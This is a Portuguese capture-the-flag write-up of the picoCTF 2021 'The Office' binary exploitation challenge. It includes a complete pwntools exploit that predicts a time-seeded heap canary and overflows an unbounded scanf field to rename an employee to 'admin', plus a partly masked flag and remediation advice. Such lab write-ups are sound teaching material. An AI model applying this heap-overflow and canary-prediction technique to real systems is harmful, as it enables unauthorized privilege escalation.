# The Office | picoCTF 2021

`pwn` `heap` `heap-overflow` `canary` `srand-time` `pwntools`

| | |
|---|---|
| **Plataforma / evento** | picoCTF 2021 |
| **Plataforma (hoje)** | CyLab Academy (`cylabacademy.net`) |
| **Categoria** | Binary Exploitation |
| **Dificuldade / pontos** | Hard |
| **Autor do desafio** | madStacks |
| **Resolvido / revalidado em** | 2026-11-02 |

## TL;DR

O binário tem um "malloc caseiro" com canário por chunk, mas o canário é `rand()` com `srand(time(0))`, previsível. O campo **Phone** é lido com `scanf("%s", ...)` sem limite, o que estoura para o cabeçalho do chunk seguinte. Eu crio dois funcionários, libero o primeiro e o recrio, usando o overflow do Phone para reescrever o cabeçalho do funcionário 1 com o canário correto (previsto pelo relógio) e sobrescrever o nome dele para `admin`. Com isso, "Get access token" me trata como admin e imprime a flag.

> [!IMPORTANT]
> **Ideia-chave:** um canário só protege se for imprevisível. Aqui ele vem de `srand(time(0))`, então eu reproduzo o mesmo `rand()` localmente e passo pela verificação do heap enquanto estouro o chunk vizinho.

## Enunciado

> I'm tired of having to secure my data on the heap, so I decided to implement my own version of malloc with canaries. It's 10x more secure and only 100x slower!

**Dica oficial:**

> The heapcheck function contains a lot of useful debugging info. See if you can get it to work.

**Arquivos:** `the_office` (ELF 32-bit). **Instância:** serviço por socket.

## Dicas progressivas

<details><summary>Dica 1</summary>O alocador guarda um canário no cabeçalho de cada chunk. De onde ele vem?</details>
<details><summary>Dica 2</summary>O canário é <code>rand()</code> depois de <code>srand(time(0))</code>. Dá para prever reproduzindo o mesmo cálculo.</details>
<details><summary>Dica 3</summary>O campo Phone usa <code>scanf("%s")</code> sem limite: estoure o Phone de um chunk recriado até o cabeçalho + nome do funcionário vizinho, escrevendo o canário certo e <code>admin\0</code>.</details>

## Ambiente

- **Máquina atacante:** Kali Linux 32-bit libs, com `pwntools` e `gcc` (ou `ctypes` + `libc.so.6` do sistema).
- **Arquivos:** `the_office` na raiz da pasta do desafio.

Na minha instância o serviço estava em `chatelaine.cylabacademy.net:16979`. O binário muda de build a cada instância (o `sha256` difere), mas o layout do chunk (offset 28, tamanho 53) e a previsibilidade do canário continuam valendo; validei isso rodando o exploit no binário novo antes do remoto.

## Resolução

### 1. Reconhecimento e a vulnerabilidade

`the_office` é um ELF 32-bit com um menu de funcionários (adicionar, remover, listar, pegar token de acesso). Ele implementa o próprio alocador: cada chunk tem um cabeçalho com um **canário** e campos de tamanho/estado. O campo **Phone** é lido assim:

```c
scanf("%s", employee + 0x18);   // sem limite de tamanho
```

Isso é um estouro de heap: dá para escrever além do espaço do funcionário, chegando ao cabeçalho do chunk seguinte. O obstáculo é o canário no meio do caminho, se eu sobrescrever o cabeçalho com um canário errado, o `heapcheck` aborta.

> [!TIP]
> **Conceito: canário previsível (`srand(time(0))`).** `rand()` é um PRNG determinístico; semeado com o horário (`time(0)`, resolução de 1 segundo), toda a sequência fica definida pelo segundo em que o processo começou. Reproduzindo `srand(ts); rand()` para o `ts` certo (com uma janela de alguns segundos para o skew de relógio), eu prevejo o canário e escrevo o valor correto no overflow. Referência: [`rand(3)`](https://man7.org/linux/man-pages/man3/rand.3.html).

### 2. Layout: do Phone de um chunk ao vizinho

Confirmando localmente o layout, a partir do início do **Phone** do funcionário 0 (recriado no espaço liberado):

- 28 bytes até o **cabeçalho** do funcionário 1;
- o cabeçalho é `canário (4)` + `size|allocated = 52|1 = 53` + `prev_size|prev_allocated = 53`;
- em seguida começa o **user data** do funcionário 1 (o nome).

Então o plano é: criar funcionário 0 e 1, liberar o 0, recriá-lo e, no Phone do 0 recriado, escrever `28*'A' + canário + 53 + 53 + "admin\0"`. Isso reconstrói um cabeçalho válido para o 1 (passa no `heapcheck`) e troca o nome do 1 para `admin`, que é o que a checagem de privilégio olha.

> **Por que recriar o 0:** o "admin" é barrado na criação; sobrescrevendo o nome **depois**, pela borda do chunk vizinho, eu contorno essa checagem.

### 3. Prevendo o canário e disparando

O canário tem que sobreviver ao `scanf("%s")`, que corta em whitespace, então descarto qualquer canário que contenha bytes `0x09..0x0d` ou `0x20`. Além disso, o canário depende do **segundo** em que o chunk é alocado no servidor: latência de rede e diferença de relógio deslocam esse segundo, então cada tentativa varre um offset de relógio (`0, -1, +1, -2, +2, ...`) até cair no segundo certo. Calculo o canário no momento da alocação (dentro da conexão), não antes.

#### `scripts/script1.py` (+ [`scripts/canary.c`](scripts/canary.c))

Script completo, idêntico ao arquivo em `scripts/`:

```python
#!/usr/bin/env python3
# The Office: heap overflow com canário previsível (srand(time(0))).
#
# Ideia: o alocador caseiro põe um canário no cabeçalho de cada chunk, mas o
# canário é rand() com srand(time(0)), então dá para prever reproduzindo o mesmo
# cálculo. O campo Phone é lido com scanf("%s") sem limite, o que estoura para o
# cabeçalho do chunk vizinho. Reconstruo esse cabeçalho com o canário correto
# (passa no heapcheck) e sobrescrevo o nome do vizinho para "admin" depois da
# checagem anti-admin. Aí "Get access token" imprime a flag.
#
# Sincronismo: o canário depende do SEGUNDO em que o chunk é alocado no servidor.
# Latência de rede e diferença de relógio deslocam esse segundo, então cada
# tentativa varre um offset de relógio (0, -1, +1, -2, +2, ...) até acertar.
#
# Uso: TARGET_HOST=host TARGET_PORT=porta python3 scripts/script1.py

from pwn import *
from ctypes import CDLL
import time, os

HOST = os.environ.get("TARGET_HOST", "chatelaine.cylabacademy.net")
PORT = int(os.environ.get("TARGET_PORT", "16979"))

context.log_level = "error"

# Reproduz rand()/srand() da libc para prever o canário (mesmo algoritmo do glibc).
libc = CDLL("libc.so.6")

# scanf("%s") corta em qualquer whitespace, então o canário não pode conter
# esses bytes (senão o payload é truncado antes do header e o ataque falha).
BAD = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def predict_canary(ts):
    libc.srand(ts & 0xffffffff)
    return libc.rand()

def safe_for_scanf(x):
    return all(b not in BAD for b in p32(x))

# ---- helpers do menu ----
def menu(p, op):
    p.sendlineafter(b"4) Get access token", str(op).encode())

def add_employee(p, name, phone=b"11111111"):
    menu(p, 1)
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"Email (y/n)? ", b"n")
    p.sendlineafter(b"Salary: ", b"1111")
    # Vulnerabilidade: Phone usa scanf("%s", employee+0x18) sem limite -> overflow.
    p.sendlineafter(b"Phone #: ", phone)
    p.sendlineafter(b"Bldg (y/n)? ", b"n")

def remove_employee(p, idx):
    menu(p, 2)
    p.sendlineafter(b"Employee #?", str(idx).encode())

def get_token(p, idx):
    menu(p, 4)
    p.sendlineafter(b"Employee #?", str(idx).encode())

# Offsets de relógio testados (em segundos) para alinhar com o time(0) do servidor.
OFFSETS = [0, -1, 1, -2, 2, -3, 3]

def attempt(offset):
    p = remote(HOST, PORT)
    try:
        add_employee(p, b"AAAA")                    # employee 0
        add_employee(p, b"alvo")                    # employee 1 (vizinho a sobrescrever)
        # O canário do chunk do employee 1 foi gerado agora, neste segundo (mais/menos o skew).
        ts = int(time.time()) + offset
        canary = predict_canary(ts)
        if not safe_for_scanf(canary):
            return False                            # canário deste segundo tem byte ruim
        remove_employee(p, 0)                       # libera o 0 para recriá-lo no mesmo lugar

        # Layout (confirmado localmente): do início do Phone do employee 0 recriado
        #   28 bytes  -> cabeçalho do employee 1
        #   canary(4) + size|alloc(=53) + prev|alloc(=53)  -> header válido
        #   "admin\0" -> sobrescreve o nome do employee 1
        payload  = b"A" * 28
        payload += p32(canary) + p32(53) + p32(53)
        payload += b"admin\x00"
        add_employee(p, b"CCCC", phone=payload)     # recria o 0 e estoura no 1

        get_token(p, 1)                             # imprime a flag se o nome for admin
        out = p.recvall(timeout=3)
        if b"academy{" in out or b"picoCTF{" in out:
            print(out.decode(errors="replace"))
            return True
    except EOFError:
        return False                                # conexão morreu: canário errado
    finally:
        try: p.close()
        except Exception: pass
    return False

def main():
    for i in range(80):
        if attempt(OFFSETS[i % len(OFFSETS)]):
            log.success("flag encontrada")
            return
    log.failure("não pegou nesta execução; rode de novo")

if __name__ == "__main__":
    main()
```

`canary.c` é a mesma previsão em C (`srand(time(0)+offset); printf("%d", rand())`), útil para conferir a semente contra a versão de `rand()` do servidor sem depender da `libc` da minha máquina.

***INSERIR no terminal: Kali (atacante)

```bash
TARGET_HOST=chatelaine.cylabacademy.net TARGET_PORT=16979 python3 scripts/script1.py
```

```text
...[snip do menu]...

academy{9571988c3c0ab8cf3119b6a9ebaXXXXX}
```

## Cadeia de ataque

```mermaid
flowchart LR
    A["Canário = rand() com srand(time(0))"] --> B[Prevejo o canário pelo relógio]
    C["scanf('%s') no Phone sem limite"] --> D[Overflow do chunk recriado no vizinho]
    B --> D
    D --> E["Header válido + nome = admin"]
    E --> F[Get access token imprime a flag]
```

## Por que funciona

A proteção do alocador é o canário no cabeçalho, mas ele é gerado por um PRNG semeado com o tempo, então é previsível com resolução de segundos, eu escrevo o valor certo e o `heapcheck` não percebe o estouro. A primitiva de escrita vem do `scanf("%s")` sem limite no Phone, que atravessa a fronteira do chunk e alcança o cabeçalho e o nome do funcionário vizinho. Sobrescrevendo o nome para `admin` depois da checagem anti-admin, a rotina de token me promove e revela a flag.

## Remediação

- Canário com fonte criptográfica (`/dev/urandom`, `getrandom`), nunca `rand()`/`time()`.
- Leitura com limite (`fgets`/`scanf("%31s")`) para o campo Phone, eliminando o overflow.
- Validar `admin` no servidor de forma que não dependa de um campo sobrescrevível adjacente na heap.

## Lições e padrões

- **Sinais para reconhecer:** "canário caseiro" + qualquer `rand()`/`time()` = previsível. `scanf("%s")`/`gets` = overflow sem limite.
- **Da próxima vez eu tentaria primeiro:** mapear o layout do chunk localmente (distâncias Phone→header→nome do vizinho) antes de brigar com o remoto.
- **Onde perdi tempo:** descartar canários com bytes de whitespace, sem esse filtro, o `scanf` trunca o payload e o ataque falha silenciosamente.

## Referências

- [`rand(3)` / `srand(3)`](https://man7.org/linux/man-pages/man3/rand.3.html)
- [pwntools: tubes](https://docs.pwntools.com/en/stable/tubes.html)

## Flag

```text
academy{9571988c3c0ab8cf3119b6a9ebaXXXXX}
```
